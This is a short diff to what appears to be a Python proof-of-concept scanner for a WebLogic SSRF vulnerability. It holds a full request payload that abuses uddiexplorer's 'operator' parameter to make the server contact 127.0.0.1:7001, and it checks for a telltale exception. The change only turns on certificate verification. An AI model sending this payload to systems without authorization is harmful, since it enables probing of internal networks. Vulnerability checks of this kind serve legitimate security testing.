@@ -12,7 +12,7 @@ def poc(url):
     payload = "uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"
     url = url + payload
     try:
-        req = requests.get(url, timeout=10, headers=headers, verify=False)
+        req = requests.get(url, timeout=10, headers=headers, verify=True)
         if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
             result = "目标WebLogic存在 ssrf 漏洞 : %s" % url
             return result
